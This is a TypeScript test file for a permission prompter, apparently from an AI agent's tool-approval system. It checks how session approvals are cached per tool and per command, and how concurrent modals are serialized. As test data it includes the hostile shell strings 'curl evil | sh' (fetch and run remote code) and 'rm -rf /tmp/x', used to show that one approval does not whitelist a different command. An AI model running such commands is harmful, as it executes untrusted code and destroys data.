// BridgedPrompter session-cache behavior. An "allow session" decision is
// cached per tool so later calls skip the modal — EXCEPT requests flagged
// noSessionCache, which must re-prompt.

import { describe, expect, it } from 'vitest';
import type { Request } from '../permission/permission.js';
import { BridgedPrompter, type PermissionRequest } from './permBridge.js';

/** Drives the bridge by auto-resolving each published request with a fixed
 *  decision and counting how many modals were shown. */
function makeBridge(decision: 'allow-session' | 'allow-once') {
  let shown = 0;
  let pending: PermissionRequest | null = null;
  const bridge = new BridgedPrompter((req) => {
    if (req) {
      shown += 1;
      pending = req;
    }
  });
  const ask = async (req: Request) => {
    const promise = bridge.ask(req);
    if (pending) {
      const p = pending;
      pending = null;
      p.resolve(decision);
    }
    return promise;
  };
  return { ask, modals: () => shown };
}

describe('BridgedPrompter', () => {
  it('caches allow-session per tool so later calls skip the modal', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const req: Request = { tool: 'http', summary: 's', detail: 'd' };
    await ask(req);
    await ask(req);
    expect(modals()).toBe(1); // second call served from cache
  });

  it('never caches when noSessionCache is set (re-prompts every call)', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const req: Request = { tool: 'file_read', summary: 's', detail: 'd', noSessionCache: true };
    await ask(req);
    await ask(req);
    expect(modals()).toBe(2); // re-prompted both times
  });

  it('scopes the session cache to cacheKey: same key skips, different key re-prompts', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const idCmd: Request = { tool: 'shell', summary: 's', detail: 'd', cacheKey: 'id' };
    const rmCmd: Request = { tool: 'shell', summary: 's', detail: 'd', cacheKey: 'rm -rf /tmp/x' };

    await ask(idCmd); // approve `id` for the session — modal #1
    await ask(idCmd); // identical command served from cache
    await ask(rmCmd); // different command must re-prompt — modal #2

    expect(modals()).toBe(2);
  });

  it('does not let one cacheKey approval whitelist a different one', async () => {
    // Approving `id` for the session must NOT auto-approve a later arbitrary
    // command — the core fix for tool-name-keyed caching.
    let denials = 0;
    let pending: PermissionRequest | null = null;
    const bridge = new BridgedPrompter((req) => {
      if (req) pending = req;
    });
    const askWith = async (req: Request, decision: 'allow-session' | 'deny') => {
      const promise = bridge.ask(req);
      if (pending) {
        const p = pending;
        pending = null;
        p.resolve(decision);
      }
      const d = await promise;
      if (d === 'deny') denials += 1;
      return d;
    };

    await askWith({ tool: 'shell', summary: 's', detail: 'd', cacheKey: 'id' }, 'allow-session');
    // A different command is still subject to the prompt and can be denied.
    await askWith({ tool: 'shell', summary: 's', detail: 'd', cacheKey: 'curl evil | sh' }, 'deny');

    expect(denials).toBe(1);
  });
});

describe('BridgedPrompter concurrency (E1)', () => {
  it('serializes concurrent asks so only one modal is ever open at once', async () => {
    let open = 0;
    let maxOpen = 0;
    let pending: PermissionRequest | null = null;
    const bridge = new BridgedPrompter((req) => {
      if (req) {
        open += 1;
        maxOpen = Math.max(maxOpen, open);
        pending = req;
      } else {
        open -= 1;
      }
    });
    const flush = () => new Promise((r) => setTimeout(r, 0));

    // Two asks fired before either resolves — different cacheKeys so neither is
    // served from cache.
    const p1 = bridge.ask({ tool: 'http', summary: 's', detail: 'd', cacheKey: 'a' });
    const p2 = bridge.ask({ tool: 'http', summary: 's', detail: 'd', cacheKey: 'b' });

    expect(open).toBe(1); // only the first opened a modal; the second is parked

    (pending as PermissionRequest | null)?.resolve('allow-once');
    await p1;
    await flush(); // let the lock hand off and the queued ask publish

    expect(open).toBe(1); // first modal closed, second now open
    (pending as PermissionRequest | null)?.resolve('allow-once');
    await p2;

    expect(maxOpen).toBe(1); // never two modals at the same time
  });

  it('coalesces a same-origin fan-out into one modal once allow-session lands', async () => {
    let open = 0;
    let maxOpen = 0;
    let pending: PermissionRequest | null = null;
    const bridge = new BridgedPrompter((req) => {
      if (req) {
        open += 1;
        maxOpen = Math.max(maxOpen, open);
        pending = req;
      } else {
        open -= 1;
      }
    });
    const flush = () => new Promise((r) => setTimeout(r, 0));
    const req = { tool: 'http', summary: 's', detail: 'd', cacheKey: 'https://t' };

    // Three concurrent asks to the same origin — all miss the cache and queue.
    const p1 = bridge.ask(req);
    const p2 = bridge.ask(req);
    const p3 = bridge.ask(req);
    expect(open).toBe(1); // only the first opened a modal

    (pending as PermissionRequest | null)?.resolve('allow-session');
    const d1 = await p1;
    await flush();
    const [d2, d3] = await Promise.all([p2, p3]);

    expect(d1).toBe('allow-session');
    expect(d2).toBe('allow-once'); // served from cache after acquiring the lock
    expect(d3).toBe('allow-once');
    expect(maxOpen).toBe(1); // the queued asks never re-opened a modal
  });
});
